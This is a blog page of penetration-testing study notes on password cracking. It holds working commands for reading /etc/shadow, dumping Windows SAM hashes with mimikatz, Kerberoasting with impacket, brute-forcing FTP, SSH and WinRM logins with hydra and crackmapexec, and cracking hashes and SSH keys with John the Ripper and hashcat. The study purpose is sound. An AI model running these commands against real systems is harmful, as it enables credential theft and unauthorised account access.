<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Password Cracking Tools and Techniques |
Agus Fahmi Aji Pramana's Blogging Site
</title><meta name=keywords content="ethical hacking,penetration testing,john the ripper,hashcat"><meta name=description content="
    Use of different tools to used for cracking password"><meta name=author content="Agus Fahmi Aji Pramana"><link rel=canonical href=http://localhost:1313/notes/password-cracking-tools-and-techniques/><link crossorigin=anonymous href=/assets/css/stylesheet.606be4c20b063263aae99830f89a0f4bbedcc98a7b8fea0b216f60439a69a571.css integrity="sha256-YGvkwgsGMmOq6Zgw+JoPS77cyYp7j+oLIW9gQ5pppXE=" rel="preload stylesheet" as=style><link crossorigin=anonymous referrerpolicy=no-referrer rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="><link rel=icon href=http://localhost:1313/favicon.ico type=image/x-icon><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=manifest href=/site.webmanifest><link rel=icon type=image/png sizes=192x192 href=http://localhost:1313/img/android-chrome-192x192.png><link rel=icon type=image/png sizes=512x512 href=http://localhost:1313/img/android-chrome-512x512.png><link rel=apple-touch-icon href=http://localhost:1313/img/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg color=#2e2e33><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33
  "><link rel=alternate hreflang=en href=http://localhost:1313/notes/password-cracking-tools-and-techniques/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PJ6VCR89GD"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PJ6VCR89GD")}</script><meta property="og:title" content="Password Cracking Tools and Techniques"><meta property="og:description" content="Use of different tools to used for cracking password"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/notes/password-cracking-tools-and-techniques/"><meta property="og:image" content="http://localhost:1313/logo.svg"><meta property="article:section" content="notes"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/logo.svg"><meta name=twitter:title content="Password Cracking Tools and Techniques"><meta name=twitter:description content="Use of different tools to used for cracking password"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Personal Notes, Learning, Self-Preparation","item":"http://localhost:1313/notes/"},{"@type":"ListItem","position":2,"name":"Password Cracking Tools and Techniques","item":"http://localhost:1313/notes/password-cracking-tools-and-techniques/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Password Cracking Tools and Techniques","name":"Password Cracking Tools and Techniques","description":"Use of different tools to used for cracking password","keywords":["ethical hacking","penetration testing","john the ripper","hashcat"],"articleBody":"Intro Dictionary Attacks CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper.\nType Path John The Ripper /usr/share/john/password.lst Rock You /usr/share/wordlists/rockyou.txt.gz locate wordlists gzip -d /usr/share/wordlists/rockyou.txt.gz rockyou.txt or gunzip /usr/share/wordlists/rockyou.txt.gz rockyou.txt Exploration Linux In Linux, the /etc/passwd file contains potentially important metadata in the GECOS field, including full name, room number, work phone, home phone, and others. Linux stores password hashes in the /etc/shadow file, which is why you need to use the sudo command to view it.\ncat /etc/passwd sudo cat /etc/shadow The unshadow utility combines the /etc/passwd and /etc/shadow files. This is done so that John the Ripper can attempt to crack the password with information from both files, using a single file.\nsudo unshadow /etc/passwd /etc/shadow \u003e combined.txt Exploitation Linux Password Kali Linux 2021.1 changed the hash function for passwords from sha512crypt (listed as $6$ in the /etc/shadow file) to yescrypt (listed as $y$ in the /etc/shadow file).\nsudo adduser vulnuser (room number: 8848.86 password vulnuser8848.86) # [Your First Name] user a password of [Your Second Name] (you will not # see anything on the screen when you type the password). # Press ENTER for all the subsequent prompts # (Full Name, Room Number, Work Phone, Home Phone, and Other) until the # last prompt, which asks “Is the information correct? [Y/n]. John The Ripper John the Ripper will not attempt to crack a password it has already cracked.\n# By the time you are reading this, support for the $y$ hashes might # be incorporated into John the Ripper, which would mean you could # leave off --format=crypt for some speedup sudo john --wordlist=/usr/share/john/password.lst --format=crypt combined.txt # See all passwords already cracked. sudo john --show --format=crypt combined.txt # To remove remembered password. sudo rm /root/.john/john.pot # By default single crack mode, uses the GECOS field, without wordlist. sudo john --format=crypt combined.txt sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt combined.txt sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 faiz.txt hydra # Target FTP hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp -vV -L username file -l username -P password file -p password # Target SSH hydra -l -P /usr/share/wordlists/rockyou.txt ssh:// -vV Windows Password Creating user:\nClick the Start button or in the search box, type Computer Management, and select Computer Management. This opens the Computer Management Console. Expand Local Users and Groups in the pane at the left. Click Users to see all the current local user accounts. Right-click on a blank area in the right pane and select New User. Fill in the fields, creating a four-digit password with just lowercase letters. Clear the checkbox next to User Must Change Password At Next Logon and click the Create reg save hklm\\SAM sam.hiv reg save hklm\\SYSTEM system.hiv mimikatz \u003e privilege::debug \u003e token::elevate # Send the next command’s output to a text file called hashes.txt: \u003e log hashes.txt # Output the usernames and hashes for all accounts on the system: \u003e lsadump::sam sam.hiv system.hiv e.g. windowshashes.txt\nBeatles:5be2f274f2f80c5d4d0c597f023f4f61:::: StarWars:b7c899154197e8a2a33121d76a240ab5:::: GetUserSPNs.py Note: If there is misconfigured account, we can obtain the credentials from Active Directory using GetUserSPNs.\nimpacket-GetUserSPNs -dc-ip .local/: -request If error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) you need to synchronize the host with the Domain Controller time.\n# Download from here https://sourceforge.net/projects/openrdate/ tar -xvzf opendate-1.2.tar.gz cd opendate ./configure make make install rdate -n John The Ripper # Brute force of 4 character. sudo crunch 4 4 | sudo john --format=NT windowshashes.txt --stdin sudo john --format=NT windowhashes.txt sudo john --show --format=NT windowshashes.txt john --format=krb5tgs --wordlist=password.txt hash.kerberoast crackmapexec # Generating passwords. e.g. (ADMINISTRATOR1996) crunch 18 18 -t ^ADMINISTRATOR19%% \u003e passwords.txt crackmapexec winrm -u Administrator -p passlist hashcat hashcat -m 13100 --force -a 0 hash.kerberoast password.txt # -m refers to hash type SSH Pass key python /usr/share/john/ssh2john.py id_rsa \u003e ssh_hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt or john ssh_hash.txt # Avoid Unprotected Warning chmod 600 id_rsa ssh -i id_rsa user@ Window Remote Management (WinRM) gem install evil-winrm evil-winrm -i -u 'admin' -p 'pass' # PowerShell Get-ChildItem -Include *.txt -File -Recurse -ErrorAction SilentlyContinue # Windows Prompt dir secret.doc /s /p # Display content of file type Remediation Account Lockout. ","wordCount":"702","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":"Agus Fahmi Aji Pramana"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/notes/password-cracking-tools-and-techniques/"},"publisher":{"@type":"Organization","name":"Agus Fahmi Aji Pramana's Blogging Site","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Agus Fahmi Aji Pramana (Alt + H)">Agus Fahmi Aji Pramana</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=http://localhost:1313/about-me title="About Me"><span>About Me</span></a></li><li><a href=http://localhost:1313/blogs title=Blogs><span>Blogs</span></a></li><li><a href=http://localhost:1313/projects title=Projects><span>Projects</span></a></li><li><a href=http://localhost:1313/slides title=Slides><span>Slides</span></a></li><li><a href=http://localhost:1313/honors title=Honors><span>Honors</span></a></li><li><a href=http://localhost:1313/search title="Search (Alt + /)" accesskey=/><i class="fa fa-search"></i></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/notes/>Personal Notes, Learning, Self-Preparation</a></div><h1 class="post-title entry-hint-parent">Password Cracking Tools and Techniques</h1><div class=post-description>Use of different tools to used for cracking password</div><div class=post-meta>4 min&nbsp;·&nbsp;702 words&nbsp;·&nbsp;Agus Fahmi Aji Pramana</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Agenda</span></summary><div class=inner><ul><li><a href=#intro aria-label=Intro>Intro</a><ul><li><a href=#dictionary-attacks aria-label="Dictionary Attacks">Dictionary Attacks</a></li></ul></li><li><a href=#exploration aria-label=Exploration>Exploration</a><ul><li><a href=#linux aria-label=Linux>Linux</a></li></ul></li><li><a href=#exploitation aria-label=Exploitation>Exploitation</a><ul><li><a href=#linux-password aria-label="Linux Password">Linux Password</a><ul><li><a href=#john-the-ripper aria-label="John The Ripper">John The Ripper</a></li><li><a href=#hydra aria-label=hydra>hydra</a></li></ul></li><li><a href=#windows-password aria-label="Windows Password">Windows Password</a><ul><li><a href=#getuserspnspy aria-label=GetUserSPNs.py>GetUserSPNs.py</a></li><li><a href=#john-the-ripper-1 aria-label="John The Ripper">John The Ripper</a></li><li><a href=#crackmapexec aria-label=crackmapexec>crackmapexec</a></li><li><a href=#hashcat aria-label=hashcat>hashcat</a></li></ul></li><li><a href=#ssh-pass-key aria-label="SSH Pass key">SSH Pass key</a></li></ul></li><li><a href=#window-remote-management-winrm aria-label="Window Remote Management (WinRM)">Window Remote Management (WinRM)</a></li><li><a href=#remediation aria-label=Remediation>Remediation</a></li></ul></div></details></div><div class=post-content><h2 id=intro>Intro<a hidden class=anchor aria-hidden=true href=#intro>#</a></h2><h3 id=dictionary-attacks>Dictionary Attacks<a hidden class=anchor aria-hidden=true href=#dictionary-attacks>#</a></h3><blockquote><p>CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper.</p></blockquote><table><thead><tr><th>Type</th><th>Path</th></tr></thead><tbody><tr><td>John The Ripper</td><td>/usr/share/john/password.lst</td></tr><tr><td>Rock You</td><td>/usr/share/wordlists/rockyou.txt.gz</td></tr></tbody></table><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>locate wordlists
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gzip -d /usr/share/wordlists/rockyou.txt.gz rockyou.txt
</span></span><span class=line><span class=cl>or
</span></span><span class=line><span class=cl>gunzip /usr/share/wordlists/rockyou.txt.gz rockyou.txt
</span></span></code></pre></div><h2 id=exploration>Exploration<a hidden class=anchor aria-hidden=true href=#exploration>#</a></h2><h3 id=linux>Linux<a hidden class=anchor aria-hidden=true href=#linux>#</a></h3><p>In Linux, the <code>/etc/passwd</code> file contains potentially important metadata in the GECOS field, including full name, room number, work phone, home phone, and others. Linux stores password hashes in the <code>/etc/shadow</code> file, which is why you need to use the sudo command to view it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /etc/passwd
</span></span><span class=line><span class=cl>sudo cat /etc/shadow
</span></span></code></pre></div><p>The <code>unshadow</code> utility combines the /etc/passwd and /etc/shadow files. This is done so that John the Ripper can attempt to crack the password with information from both files, using a single file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo unshadow /etc/passwd /etc/shadow &gt; combined.txt
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><h3 id=linux-password>Linux Password<a hidden class=anchor aria-hidden=true href=#linux-password>#</a></h3><blockquote><p>Kali Linux 2021.1 changed the hash function for passwords from sha512crypt (listed as $6$ in the /etc/shadow file) to yescrypt (listed as $y$ in the /etc/shadow file).</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo adduser vulnuser <span class=o>(</span>room number: 8848.86 password vulnuser8848.86<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1># [Your First Name] user a password of [Your Second Name] (you will not</span>
</span></span><span class=line><span class=cl><span class=c1># see anything on the screen when you type the password).</span>
</span></span><span class=line><span class=cl><span class=c1># Press ENTER for all the subsequent prompts</span>
</span></span><span class=line><span class=cl><span class=c1># (Full Name, Room Number, Work Phone, Home Phone, and Other) until the</span>
</span></span><span class=line><span class=cl><span class=c1># last prompt, which asks “Is the information correct? [Y/n].</span>
</span></span></code></pre></div><h4 id=john-the-ripper>John The Ripper<a hidden class=anchor aria-hidden=true href=#john-the-ripper>#</a></h4><blockquote><p>John the Ripper will not attempt to crack a password it has already cracked.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># By the time you are reading this, support for the $y$ hashes might</span>
</span></span><span class=line><span class=cl><span class=c1># be incorporated into John the Ripper, which would mean you could</span>
</span></span><span class=line><span class=cl><span class=c1># leave off --format=crypt for some speedup</span>
</span></span><span class=line><span class=cl>sudo john --wordlist<span class=o>=</span>/usr/share/john/password.lst --format<span class=o>=</span>crypt combined.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># See all passwords already cracked.</span>
</span></span><span class=line><span class=cl>sudo john --show --format<span class=o>=</span>crypt combined.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># To remove remembered password.</span>
</span></span><span class=line><span class=cl>sudo rm /root/.john/john.pot
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># By default single crack mode, uses the GECOS field, without wordlist.</span>
</span></span><span class=line><span class=cl>sudo john --format<span class=o>=</span>crypt combined.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt --format<span class=o>=</span>crypt combined.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt --format<span class=o>=</span>Raw-SHA256 faiz.txt
</span></span></code></pre></div><h4 id=hydra>hydra<a hidden class=anchor aria-hidden=true href=#hydra>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Target FTP</span>
</span></span><span class=line><span class=cl>hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ftp &lt;target-ip-addr&gt; -vV
</span></span><span class=line><span class=cl>  -L username file
</span></span><span class=line><span class=cl>  -l username
</span></span><span class=line><span class=cl>  -P password file
</span></span><span class=line><span class=cl>  -p password
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Target SSH</span>
</span></span><span class=line><span class=cl>hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt ssh://&lt;target-ip-addr&gt; -vV
</span></span></code></pre></div><h3 id=windows-password>Windows Password<a hidden class=anchor aria-hidden=true href=#windows-password>#</a></h3><p>Creating user:</p><ul><li>Click the <strong>Start</strong> button or in the search box, type <strong>Computer Management</strong>, and select <strong>Computer Management</strong>. This opens the <strong>Computer Management Console</strong>.</li><li>Expand <strong>Local Users and Groups</strong> in the pane at the left.</li><li>Click <strong>Users</strong> to see all the current local user accounts.</li><li>Right-click on a blank area in the right pane and select <strong>New User</strong>.</li><li>Fill in the fields, creating a four-digit password with just lowercase letters.</li><li>Clear the checkbox next to User Must Change Password At Next Logon and click the <strong>Create</strong></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>reg</span> <span class=n>save</span> <span class=n>hklm</span><span class=p>\</span><span class=n>SAM</span> <span class=n>sam</span><span class=p>.</span><span class=py>hiv</span>
</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=n>save</span> <span class=n>hklm</span><span class=p>\</span><span class=n>SYSTEM</span> <span class=n>system</span><span class=p>.</span><span class=py>hiv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mimikatz</span>
</span></span><span class=line><span class=cl><span class=p>&gt;</span> <span class=n>privilege</span><span class=p>::</span><span class=n>debug</span>
</span></span><span class=line><span class=cl><span class=p>&gt;</span> <span class=n>token</span><span class=p>::</span><span class=n>elevate</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Send the next command’s output to a text file called hashes.txt:</span>
</span></span><span class=line><span class=cl><span class=p>&gt;</span> <span class=n>log</span> <span class=n>hashes</span><span class=p>.</span><span class=py>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Output the usernames and hashes for all accounts on the system:</span>
</span></span><span class=line><span class=cl><span class=p>&gt;</span> <span class=n>lsadump</span><span class=p>::</span><span class=n>sam</span> <span class=n>sam</span><span class=p>.</span><span class=py>hiv</span> <span class=n>system</span><span class=p>.</span><span class=py>hiv</span>
</span></span></code></pre></div><p>e.g. windowshashes.txt</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>Beatles:5be2f274f2f80c5d4d0c597f023f4f61::::
</span></span><span class=line><span class=cl>StarWars:b7c899154197e8a2a33121d76a240ab5::::
</span></span></code></pre></div><h4 id=getuserspnspy>GetUserSPNs.py<a hidden class=anchor aria-hidden=true href=#getuserspnspy>#</a></h4><blockquote><p>Note: If there is misconfigured account, we can obtain the credentials from Active Directory using <code>GetUserSPNs</code>.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-GetUserSPNs -dc-ip &lt;dc-ip-addr&gt; &lt;host&gt;.local/&lt;user&gt;:&lt;pass&gt; -request
</span></span></code></pre></div><blockquote><p>If error: <code>Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> you need to synchronize the host with the Domain Controller time.</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Download from here https://sourceforge.net/projects/openrdate/</span>
</span></span><span class=line><span class=cl>tar -xvzf opendate-1.2.tar.gz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>cd</span> opendate
</span></span><span class=line><span class=cl>./configure
</span></span><span class=line><span class=cl>make
</span></span><span class=line><span class=cl>make install
</span></span><span class=line><span class=cl>rdate -n &lt;domain-controller-ip&gt;
</span></span></code></pre></div><h4 id=john-the-ripper-1>John The Ripper<a hidden class=anchor aria-hidden=true href=#john-the-ripper-1>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Brute force of 4 character.</span>
</span></span><span class=line><span class=cl>sudo crunch <span class=m>4</span> <span class=m>4</span> <span class=p>|</span> sudo john --format<span class=o>=</span>NT windowshashes.txt --stdin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo john --format<span class=o>=</span>NT windowhashes.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo john --show --format<span class=o>=</span>NT windowshashes.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>john --format<span class=o>=</span>krb5tgs --wordlist<span class=o>=</span>password.txt hash.kerberoast
</span></span></code></pre></div><h4 id=crackmapexec>crackmapexec<a hidden class=anchor aria-hidden=true href=#crackmapexec>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Generating passwords. e.g. (ADMINISTRATOR1996)</span>
</span></span><span class=line><span class=cl>crunch <span class=m>18</span> <span class=m>18</span> -t ^ADMINISTRATOR19%% &gt; passwords.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>crackmapexec winrm &lt;target-ip-addr&gt; -u Administrator -p passlist
</span></span></code></pre></div><h4 id=hashcat>hashcat<a hidden class=anchor aria-hidden=true href=#hashcat>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>13100</span> --force -a <span class=m>0</span> hash.kerberoast password.txt <span class=c1># -m refers to hash type</span>
</span></span></code></pre></div><h3 id=ssh-pass-key>SSH Pass key<a hidden class=anchor aria-hidden=true href=#ssh-pass-key>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python /usr/share/john/ssh2john.py id_rsa &gt; ssh_hash.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt ssh_hash.txt
</span></span><span class=line><span class=cl>or
</span></span><span class=line><span class=cl>john ssh_hash.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Avoid Unprotected Warning</span>
</span></span><span class=line><span class=cl>chmod <span class=m>600</span> id_rsa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ssh -i id_rsa user@&lt;target-ip-addr&gt;
</span></span></code></pre></div><h2 id=window-remote-management-winrm>Window Remote Management (WinRM)<a hidden class=anchor aria-hidden=true href=#window-remote-management-winrm>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gem install evil-winrm
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>evil-winrm -i &lt;target-windows-ip-addr&gt; -u <span class=s1>&#39;admin&#39;</span> -p <span class=s1>&#39;pass&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PowerShell</span>
</span></span><span class=line><span class=cl>Get-ChildItem -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
</span></span><span class=line><span class=cl><span class=c1># Windows Prompt</span>
</span></span><span class=line><span class=cl>dir secret.doc /s /p
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Display content of file</span>
</span></span><span class=line><span class=cl><span class=nb>type</span> &lt;path&gt;
</span></span></code></pre></div><h2 id=remediation>Remediation<a hidden class=anchor aria-hidden=true href=#remediation>#</a></h2><ul><li>Account Lockout.</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/ethical-hacking/>Ethical Hacking</a></li><li><a href=http://localhost:1313/tags/penetration-testing/>Penetration Testing</a></li><li><a href=http://localhost:1313/tags/john-the-ripper/>John the Ripper</a></li><li><a href=http://localhost:1313/tags/hashcat/>Hashcat</a></li></ul></footer></article></main><footer class=footer><span>&copy;
2025
<a href=http://localhost:1313/>Agus Fahmi Aji Pramana's Blogging Site</a></span>
| <span><a href=/terms-and-conditions>Terms and Conditions</a>
</span>|
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>
&
      <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span><br></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})}),document.addEventListener("DOMContentLoaded",function(){var e=document.querySelectorAll(".project");e.forEach(function(e){e.addEventListener("click",function(t){t.target.closest(".small-icons")||window.open(e.getAttribute("data-project-link"),"_blank").focus()})})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>